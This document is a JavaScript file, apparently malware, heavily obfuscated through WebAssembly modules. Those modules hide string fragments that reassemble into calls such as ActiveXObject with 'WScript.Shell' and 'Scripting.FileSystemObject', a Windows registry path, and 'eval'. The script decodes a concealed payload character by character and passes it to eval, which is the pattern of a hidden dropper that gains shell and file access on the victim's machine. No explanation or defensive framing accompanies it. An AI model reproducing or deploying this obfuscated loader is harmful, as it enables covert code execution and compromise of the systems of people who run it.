const __universalAtob = function (b64Encoded) {
    try {
        let binary_string = atob(b64Encoded), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(b64Encoded, 'base64'));
    }
};
const __forWasmBuffer = 'AGFzbQEAAAABiICAgAACYAAAYAABfwKkgICAAAMDZW52BHRlc3QAAQNlbnYGdXBkYXRlAAADZW52BGJvZHkAAAOCgICAAAEABISAgIAAAXAAAAWDgICAAAEAAQeRgICAAAIGbWVtb3J5AgAEZGF0YQADCpmAgIAAAZOAgIAAAAJAA0AQAEUNARACEAEMAAsLCw==';
const __forWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__forWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__forWasmBuffer, 'base64'));
    }
})());
const __ifWasmBuffer = 'AGFzbQEAAAABiICAgAACYAAAYAF/AAKfgICAAAIDZW52CGltcEZ1bmMxAAADZW52CGltcEZ1bmMyAAADgoCAgAABAQSEgICAAAFwAAAFg4CAgAABAAEHkYCAgAACBm1lbW9yeQIABGRhdGEAAgqSgICAAAGMgICAAAAgAARAEAAFEAELCw==';
const __ifWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__ifWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__ifWasmBuffer, 'base64'));
    }
})());
const __wasmStringModules = ['AGFzbQEAAAAFg4CAgAABAAEGrISAgABdfwBBAQt/AEESC38AQT4LfwBB5AALfwBBlAELfwBB6gILfwBBkgMLfwBBxgMLfwBB1gMLfwBBgAQLfwBBigQLfwBBlAQLfwBB/gQLfwBBqgULfwBBzAULfwBBiAYLfwBBlgYLfwBB6gYLfwBB8AYLfwBBngcLfwBBtgcLfwBBvAcLfwBBrggLfwBBzAgLfwBB0ggLfwBB3ggLfwBB4AgLfwBB5AgLfwBB8AgLfwBBjgkLfwBBrgkLfwBBwAkLfwBB6gkLfwBB7gkLfwBBzAoLfwBB3goLfwBB9AoLfwBBggsLfwBBwgsLfwBB5gsLfwBBwgwLfwBB+AwLfwBBmg0LfwBBtg0LfwBBzg0LfwBB7A0LfwBBtA4LfwBBug4LfwBB7A4LfwBB+g4LfwBBhA8LfwBBig8LfwBBkA8LfwBBng8LfwBBsA8LfwBBtA8LfwBB9g8LfwBBqBALfwBBjhELfwBBvhELfwBB6hELfwBB8hELfwBB9hELfwBBmhILfwBBqBILfwBBvBILfwBB6hILfwBBlhMLfwBBzhMLfwBB4hMLfwBB6hMLfwBBlhQLfwBBuhQLfwBBwhQLfwBB4hQLfwBB+BQLfwBBphULfwBBvBULfwBB2hULfwBB5BYLfwBB/BYLfwBBgBcLfwBBkhcLfwBBqhcLfwBBshcLfwBBvBcLfwBB3hcLfwBB9BcLfwBBghgLfwBB8hgLfwBB/BgLfwBBkBoLfwBBlBoLB8WGgIAAXgZtZW1vcnkCAAVkYXRhMAMABWRhdGExAwEFZGF0YTIDAgVkYXRhMwMDBWRhdGE0AwQFZGF0YTUDBQVkYXRhNgMGBWRhdGE3AwcFZGF0YTgDCAVkYXRhOQMJBmRhdGExMAMKBmRhdGExMQMLBmRhdGExMgMMBmRhdGExMwMNBmRhdGExNAMOBmRhdGExNQMPBmRhdGExNgMQBmRhdGExNwMRBmRhdGExOAMSBmRhdGExOQMTBmRhdGEyMAMUBmRhdGEyMQMVBmRhdGEyMgMWBmRhdGEyMwMXBmRhdGEyNAMYBmRhdGEyNQMZBmRhdGEyNgMaBmRhdGEyNwMbBmRhdGEyOAMcBmRhdGEyOQMdBmRhdGEzMAMeBmRhdGEzMQMfBmRhdGEzMgMgBmRhdGEzMwMhBmRhdGEzNAMiBmRhdGEzNQMjBmRhdGEzNgMkBmRhdGEzNwMlBmRhdGEzOAMmBmRhdGEzOQMnBmRhdGE0MAMoBmRhdGE0MQMpBmRhdGE0MgMqBmRhdGE0MwMrBmRhdGE0NAMsBmRhdGE0NQMtBmRhdGE0NgMuBmRhdGE0NwMvBmRhdGE0OAMwBmRhdGE0OQMxBmRhdGE1MAMyBmRhdGE1MQMzBmRhdGE1MgM0BmRhdGE1MwM1BmRhdGE1NAM2BmRhdGE1NQM3BmRhdGE1NgM4BmRhdGE1NwM5BmRhdGE1OAM6BmRhdGE1OQM7BmRhdGE2MAM8BmRhdGE2MQM9BmRhdGE2MgM+BmRhdGE2MwM/BmRhdGE2NANABmRhdGE2NQNBBmRhdGE2NgNCBmRhdGE2NwNDBmRhdGE2OANEBmRhdGE2OQNFBmRhdGE3MANGBmRhdGE3MQNHBmRhdGE3MgNIBmRhdGE3MwNJBmRhdGE3NANKBmRhdGE3NQNLBmRhdGE3NgNMBmRhdGE3NwNNBmRhdGE3OANOBmRhdGE3OQNPBmRhdGE4MANQBmRhdGE4MQNRBmRhdGE4MgNSBmRhdGE4MwNTBmRhdGE4NANUBmRhdGE4NQNVBmRhdGE4NgNWBmRhdGE4NwNXBmRhdGE4OANYBmRhdGE4OQNZBmRhdGE5MANaBmRhdGE5MQNbBmRhdGE5MgNcC7ydgIAAXQBBAQsPWnZaYVpyJTIwWmZaSVoAAEESCytCclpEWmFacFpiWktacWhOa1pnbVolMjBaJTNEJTIwWm5lWnclMjBaQVoAAEE+CyRjdFppWnZlWlhPWmJaamVaY3RaKFolMjJaU1poWmVabGxaLgAAQeQACy5aQVpQcGxaaVpjWmFaVFppWm9OWiUyMiklM0JaJTIwWnZaYVpyWiUyMFpJdVoAAEGUAQvUAWlaU05aZFpsWnhacVdaVFpHcGZqWnZaeXIlMjBaJTNEJTIwWm5lWndaJTIwQWNadFppWnZlWFpPWmJqWmVjdFooWiUyMndaU1pjWlJpcFp0LnNoZWxabFolMjJaKSUzQlolMjBadmFyJTIwWlB2R1puc1pPWlNaVlpmcVpBTFpicFpXelpjWmhaJTIwWiUzRFolMjBablpld1olMjBaQWNadGladmVaWFpPWmJaalplWmN0KFolMjJzY1pyWmlacHRaaU5aZy5aZlpJbGVac1p5WnMAAEHqAgsmWnRaZW1vQmplWkNadCUyMlopWiUzQlolMjBaZlp1Wm5jdGlvWgAAQZIDCzNuJTIwWnVaeG1aY1pNWlZab1pyZlpHaU5Rc0xaZVooWilaJTIwJTdCJTIwWnJlWnRadQAAQcYDCw9aclpuJTIwWlBadkducwAAQdYDCylPU1ZaZlpxQUxaYlpwWld6WmNoWi5aRm9abGRlWnJFWnhpc1p0WnNaAABBgAQLCCglMjJyWlcAAEGKBAsIcFp1WnNaTAAAQZQEC2laQVBFS1pucWFpWnlOWmVaJTIyKSUzQiUyMFolN0R2WmFyWiUyMEFPWnpaeFp2d1pNWnNjTlpYWnRIWmdaVUdaJTIwWiUzRFolMjBaMTdaMFo3WjI2MTclMkYxWjdaMDdaMlo2WjFaNwAAQf4ECypaJTNCJTIwWnZaYVpyJTIwWmNxWmpaU1pGbVpKeVpOWlZaUGJaa3haTQAAQaoFCyFaJTIwJTNEWiUyMCUyMiUyMlolM0JaJTIwWmZadVpuWgAAQcwFCztjWnRaaVpvWm5aJTIwUFpCWlZnWmZaQ2NaWVdaa0RkWnhaU1poZVpqdyhadWxacktablpDWkpaVVpnAABBiAYLDW9aVlpjWnFaYlpOUgAAQZYGC1NaZGFaKVolMjAlN0JaJTIwWnJaZVp0dVpyblolMjBaU1p0cmluWmdaLmZacm9tQ2haYVpyQ1pvZGVaKFp1WmxaclpLblpDWkpVWmdab1pWWmNxAABB6gYLBGJOUgAAQfAGCyxaZFphWiklM0JaJTIwWiU3RCUyMFpmdVpuWmN0aW9ablolMjBLbXVaa1pzAABBngcLF1ppWkNaU1pjYVpIYlpxcm9adlplKEUAAEG2BwsEWk1CAABBvAcLcGdablpTWmFaSFp0WkNaSURaZU9aZm0lMkMlMjBvWkFaTVpLWldkSlpmd1p4WnN2aVpCcClaJTIwJTdCWiUyMHJaZXRadXJablolMjBFWk1CWmduU2FIWnRaQ1pJWkRlT1pmWm1aLlpjaGFyWkNvWgAAQa4ICx1kZVpBWnQoWm9BWk1aS1daZFpKWmZad1p4c1p2AABBzAgLBWlCcFoAAEHSCAsLKSUzQiUyMCU3RAAAQd4ICwEAAEHgCAsCWgAAQeQICwp2YXJaJTIwU1oAAEHwCAscYlpBWm5aUFRabFpCWmhSWndaaVpITVpOYVpkAABBjgkLHlolMjBaJTNEJTIwWkladVppU05kWmxaeFpxWldaAABBrgkLEFRaR1pwWmZqWnZaeXJaLgAAQcAJCylaUlplWmdSWmVhWmRaKFpVWlludUtaa1plWnZIYkFadFRaV1p6WihaAABB6gkLAmQAAEHuCQtdTXFaUVpub2taVVp2WklaR0xsZ2klMkNaJTIwWiUyMlpBQlpDWiUyMikpLlpjWmhhWnJDb1pkWmVBdFooWkFPWnp4WnZ3Wk1ac1pjTlpYWnRIWmdaVVpHWiklM0IAAEHMCgsQLWh5ZC1vLUMlMkJ4LXFoAABB3goLFXYtZmRzaC1DLSUyQiUyNXktZEMtAABB9AoLDXUoNTN6dmsoLTUtMwAAQYILCz9DKDZHQygtNS1DLTMtQy1xaC16KDUzREMtZndDbEN5aCU1Qi1SQ2VtaENmQy13KC01LSUzQigtNTUtenZmdQAAQcILCyNsLXMtdyg1Q0gtdi1DLWtoLW9vQy0oLTU1KC01LUMlM0MoAABB5gsLWzYtQ0VDKDNHKEMzQ0RDLXktZHUoNUMzLXZrQy0oNUMzKDZHLSg1QzNxaHotKC01M0RDZndsQ3loJTVCUi1lLW1oQ2Z3KDUlM0ItKDVDNS12a0MtaG8tQ28oLQAAQcIMCzU1SC1kLUNzc0Mtb2wtZmR3bHJxKDVDLTUoLTUlM0MoNkNFLSgzRy0oM0R5Q2RDLXUoQy01AABB+AwLIDNDLUtDLVdXU0MoNUMzLUMoNi1HKDVDLTNxLWgtQ3oAAEGaDQsaLShDLTUzRGYtd2x5aCU1QlJlbS1oZkN3KAAAQbYNCxc1LUMlM0ItKC01LTVDUENWJTVCLUNQAABBzg0LHC1DTyg2LTVDKDUtSCU1QlBPLUMtS1ctV1MoNQAAQewNC0Y1QygtQy01JTNDQy0oQzYtRShDMy1HKDNEQ3ktZHUtKDUzLUMtVkN3dWhkcC1DKDUzLSg2Q0coQzUtQzNxaC16KDUzQ0QAAEG0DgsFQ2ZDdwAAQboOCzAtbC15Q2gtJTVCUi1lbWhmLUMtdyhDNUMtJTNCQyg1QzVERy1SR0UtKDVDSFZDdwAAQewOCwwtdWhkcCgtNTUoLQAAQfoOCwk1JTNDKEM2QwAAQYQPCwRFKC0AAEGKDwsFM0MtRwAAQZAPCwwoM0QteWRDLXUoNQAAQZ4PCxAzcy1kd0NrKDUzKDZHKDUAAEGwDwsDLTMAAEG0DwtBenZrKEM1SFZzaGZsZG8tSUNyQy1vZ2h1LUN2Qy0oLTUtJTNCLSgtNUM1Qy1XaHBzLUMtb2RDd2h2Qy0oQzU1KAAAQfYPCzE1QyUzQygtNUUoNUMtNSgtOENGKDhDRi0oQzUtQzUoNUUoNSUzQig1JTNCQ1BkLXcAAEGoEAtlLWtDLShDLTVIdS1DZHFDZy1DLXJwLSg1JTNCLUMoNSUzQ0MoQy01RCg2JTNDKC02LSUzQygtQzYlM0MtKC1DNi0lM0MoQzYtJTNDKC02LSUzQyg1Qy0lM0MoLTVFKDYlM0MoLQAAQY4RCy82JTNDQy0oLTYlM0MoLUMtNi0lM0MoJTNBLUNGLUMoNkMzKC1DNUMlM0MoQzVFAABBvhELKig1QzVDLShDNS1IaCU3QmgtKC01QzVDKEM2RUMtKEMzRygtM0RLV1ctAABB6hELBlMoQzUtAABB8hELAkgAAEH2EQsiUkNzaHEoQzUlM0ItQyhDNUM1SkhDV0MtKC1DNTVDLSgtAABBmhILDTVGKEM1MyhDNTVDawAAQagSCxN3dy1zKDYtREMoLUMtNS1JKC0AAEG8EgstNS1JLXItQ3gtQ2ctbGQteEN3bENwZHdDbHktZihDNUNILXctci1DcygtNUkAAEHqEgsqQ3ZoZC1DLXVmLWsoNUgtQ3Nrcy0oNUMtNUMoLTVGKEM1M2lkby12aCgAAEGWEws3NSUzQy0oNkUoNTNLLVctV0NTLSg1SC1DVi1oQ3FnKC01JTNCKC01LSUzQyg2RS1DKDUtMy1DAABBzhMLE2xpQy0oNTMoNSUzQktXLVdDUwAAQeITCwZDKEM1LQAAQeoTCytILVYtd2RDdy14LXYtQy0oQy01QzNDKC02R0MtKDZHKDUtQy0zLSg2QzUAAEGWFAsjKEM2My0oNkMzKDUlM0MoLUM1LTMtKC0lM0FDRShDLTMtRwAAQboUCwcoM0RDVncAAEHCFAsfLXVoLUNkQ3AoLTVIUnNDaC1xLSg1JTNCKDUlM0MoAABB4hQLFDZFLSgtNS0zVnctdWgtZEMtcEMAAEH4FAssLSgtNUgtVy0lN0NzaEMoNS0zKEMtNi1HLShDLTVDM0MoQy02LUM0KDZFQwAAQaYVCxQoLTUtM1ZDLXctdWgtZHBDLSgtAABBvBULHTVILUNaLXUtbEN3LUMtaC0oNS0lM0ItS1dXQ1MAAEHaFQuJASg1SC1VLUMtaEN2Q3NyLXF2LWhFcmclN0MoLTUlM0MoNkVDLSg1QzMoM0ctKDNELVYtQy13dS1oZEMtcC1DKDVIU3J2LWxDd2xycUMoNTMtKC02Q0dDKDUzQyg2Myg2RUMoNS0zVkN3LXVoQ2RwLSg1LUhDLVZDZC1DLXloLVdySWwtb2goLUMAAEHkFgsXLTUlM0JzQy1kd2soLTUtRig1LTMoNgAAQfwWCwM1LQAAQYAXCxAoQzVDLSUzQ0MoQzZFQygAAEGSFwsWQy0zQ0coQzNEQ1Z3dWhDZC1wQy0oAABBqhcLBjUtQ0hGAABBshcLCC1Db3J2aCgAAEG8FwsgQzUlM0IoNSUzQy0oNkNFLSg1QzMtdmsoNS1ILUNWLQAAQd4XCxRraG9vLUNIQyU3QmhmeHdoLSg1AABB9BcLDEMtJTNCcy1kQ3drAABBghgLbig1RihDLTUzLSg1NSg1LUM1KDVGQyg1QzNDKEM1LUM1KDVDNShDNUNGLSgtNTMtKC01NXJzLWgtcSg1NS0oNUMtRig1My0oQzY0LSg1JTNDLUMtKDZFKDVDLTNDKCUzQUclMjUlMkMlMkMlM0UAAEHyGAsJQUJDSEtBQkMAAEH8GAuSAUxNJTVDc29BQkNGQUJDVEFCQ1dBQkNhUmUlNUNtQUJDSUFCQ2NSQUJDT0FCQ1NPQUJDZlQlNUNXQUJDaU5EQUJDb0FCQ1dzQUJDJTIwQUJDTlQlNUNjQUJDdXJyZW5BQkN0QUJDdkFCQ0VyQUJDc0FCQ2lBQkNvTiU1Q3NBQkN5c3RFQUJDTUFCQ3JPQUJDb3QAAEGQGgsCWgAAQZQaCwVldmFsAA=='].map(__bytes => {
    const bytesToUse = __universalAtob(__bytes);
    return new WebAssembly.Instance(new WebAssembly.Module(bytesToUse));
});
const lS = (wI, pos, iWC) => {
    let __str = '';
    if (!Array.isArray(wI)) {
        let __targetModule = __wasmStringModules[wI];
        let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
        const __stringKey = `data${ pos }`;
        let __start = __targetModule.exports[__stringKey] - 1;
        let __str = '';
        let i = __start;
        let __c = __mem[i++];
        while (!(parseInt(__c) & 128) && __mem[i]) {
            __str += __c;
            __c = String.fromCharCode(__mem[i++]);
        }
        __str += __c;
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    } else {
        for (const __wasmIndex of wI) {
            let __targetModule = __wasmStringModules[__wasmIndex];
            let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
            const __stringKey = `data${ pos }`;
            let __start = __targetModule.exports[__stringKey] - 1;
            let i = __start;
            let __c = __mem[i++];
            while (!(parseInt(__c) & 128) && __mem[i]) {
                __str += __c;
                __c = String.fromCharCode(__mem[i++]);
            }
            __str += __c;
        }
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    }
};
var cKzrSWjTkJAMulpdQna = lS(0, 0) + lS(0, 1) + lS(0, 2) + lS(0, 3) + lS(0, 4) + lS(0, 5) + lS(0, 6) + lS(0, 7) + lS(0, 8) + lS(0, 9) + lS(0, 10) + lS(0, 11) + lS(0, 12) + lS(0, 13) + lS(0, 14) + lS(0, 15) + lS(0, 16) + lS(0, 17) + lS(0, 18) + lS(0, 19) + lS(0, 20) + lS(0, 21) + lS(0, 22) + lS(0, 23) + lS(0, 24);
function UYnuKkevHbAtTWz(SewBhbVfkCLgsrj, SKYyrzTcXPvnipHMNa) {
    return SewBhbVfkCLgsrj.split(SKYyrzTcXPvnipHMNa).join(lS(0, 25));
}
var TLMVzXycSPNCqov = window[lS(0, 92, true)](UYnuKkevHbAtTWz(cKzrSWjTkJAMulpdQna, lS(0, 26)));
(() => {
    const __ifInstance0 = new WebAssembly.Instance(__ifWasmModule, {
        env: {
            impFunc1: () => {
                {
                    var mULJTkayfAdFoQXnr = lS(0, 27) + lS(0, 28) + lS(0, 29) + lS(0, 30) + lS(0, 31) + lS(0, 32) + lS(0, 33);
                    var pTWSdMeDntAxYchJCyU = lS(0, 34) + lS(0, 35) + lS(0, 36) + lS(0, 37) + lS(0, 38) + lS(0, 39) + lS(0, 40) + lS(0, 41) + lS(0, 42) + lS(0, 43) + lS(0, 44) + lS(0, 45) + lS(0, 46) + lS(0, 47) + lS(0, 48) + lS(0, 49) + lS(0, 50) + lS(0, 51) + lS(0, 52) + lS(0, 53) + lS(0, 54) + lS(0, 55) + lS(0, 56) + lS(0, 57) + lS(0, 58) + lS(0, 59) + lS(0, 60) + lS(0, 61) + lS(0, 62) + lS(0, 63) + lS(0, 64) + lS(0, 65) + lS(0, 66) + lS(0, 67) + lS(0, 68) + lS(0, 69) + lS(0, 70) + lS(0, 71) + lS(0, 72) + lS(0, 73) + lS(0, 74) + lS(0, 75) + lS(0, 76) + lS(0, 77) + lS(0, 78) + lS(0, 79) + lS(0, 80) + lS(0, 81) + lS(0, 82) + lS(0, 83) + lS(0, 84) + lS(0, 85) + lS(0, 86) + lS(0, 87) + lS(0, 88);
                    var dMqQnokUvIGLlgi = lS(0, 89) + lS(0, 90);
                    var trzAhaUnmWVdjoCk = window[lS(0, 92, true)](UYnuKkevHbAtTWz(mULJTkayfAdFoQXnr, lS(0, 91)));
                    (() => {
                        var ARjyzTnpUoBXVFiP = 0;
                        const __forInstance0 = new WebAssembly.Instance(__forWasmModule, {
                            env: {
                                test: () => {
                                    return ARjyzTnpUoBXVFiP < pTWSdMeDntAxYchJCyU.length ? 1 : 0;
                                },
                                update: () => {
                                    ARjyzTnpUoBXVFiP++;
                                },
                                body: () => {
                                    {
                                        AOzxvwMscNXtHgUG = KmuksiCScaHbqrove(pTWSdMeDntAxYchJCyU, ARjyzTnpUoBXVFiP) - 20724 * SbAnPTlBhRwiHMNad / 400664;
                                        (() => {
                                            const __ifInstance1 = new WebAssembly.Instance(__ifWasmModule, {
                                                env: {
                                                    impFunc1: () => {
                                                        {
                                                            cqjSFmJyNVPbkxM += PBVgfCcYWkDdxShejw(AOzxvwMscNXtHgUG);
                                                        }
                                                    },
                                                    impFunc2: () => {
                                                    }
                                                }
                                            });
                                            const __exports = __ifInstance1.exports;
                                            return __exports.data(AOzxvwMscNXtHgUG != 408072 * SbAnPTlBhRwiHMNad / 563528 && AOzxvwMscNXtHgUG != 142208 * SbAnPTlBhRwiHMNad / 128876 ? 1 : 0);
                                        })();
                                    }
                                }
                            }
                        });
                        const __exports = __forInstance0.exports;
                        return __exports.data();
                    })();
                    var DlWmugxXhYcUqnb = window[lS(0, 92, true)](cqjSFmJyNVPbkxM);
                }
            },
            impFunc2: () => {
            }
        }
    });
    const __exports = __ifInstance0.exports;
    return __exports.data(uxmcMVorfGiNQsLe() == false ? 1 : 0);
})();